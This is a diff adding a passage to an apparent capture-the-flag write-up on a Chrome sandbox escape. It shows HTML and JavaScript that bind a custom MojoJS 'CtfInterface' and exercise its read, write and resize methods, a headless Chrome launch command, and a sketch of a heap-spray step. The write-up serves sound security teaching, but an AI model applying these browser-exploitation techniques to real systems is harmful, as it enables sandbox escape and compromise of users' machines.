@@ -487,6 +487,48 @@ void CtfInterfaceImpl::Write(double value,
 }
 ```
 
+First, let's verify we can use the javascript mojo bindings to interact with a mojo interface.
+
+We begin by creating the HTML file `sbx_exploit.html` to import the mojo javascript bindings to the `CTFInterface`, then we execute our javascript code.
+```html
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>browser</title>
+        <script src="mojo_bindings/mojo_bindings.js"></script>
+        <script src="mojo_bindings/third_party/blink/public/mojom/CTF/ctf_interface.mojom.js"></script>
+        <script src="mojo_bindings/third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
+    </head>
+    <body>
+        <script src="sbx_exploit.js"></script>
+    </body>
+</html>
+```
+
+In our javascript code which we will write in `sbx_exploit.js`, we can interact with the `CTFInterface`'s resize, read, and write methods as shown below:
+```javascript
+// create a new CTFInterface
+let ctfi = new blink.mojom.CtfInterfacePtr();
+Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(ctfi).handle, 'context', true);
+
+// resize(size) the interface
+ctfi.resizeVector(0x60 / 8); // sizeof(CtfInterface)
+
+// read(offset) from the interface
+ctfi.read(0x60 / 8).value.f2i();
+
+// write(value, offset) to the interface
+ctfi.write(1.1, 1);
+```
+
+A small gotcha is that we have to pass the `--remote-debugging-port=9222` command-line switch to get the mojo code running.
+
+We can also individually test the sandbox escape exploit by enabling mojo with `--enable-blink-features=MojoJS`.
+
+```bash
+$ ./chrome --headless --disable-gpu --remote-debugging-port=9222 --enable-blink-features=MojoJS --enable-logging=stderr --user-data-dir=/tmp/userdata ./sbx_exploit.html
+```
+
 With arbitrary size allocation, we can spray `CtfInterface` objects that we control into memory along with a vector of the same size.
 
 We search for a magic value that we put to indicate we are at the right offset in memory.
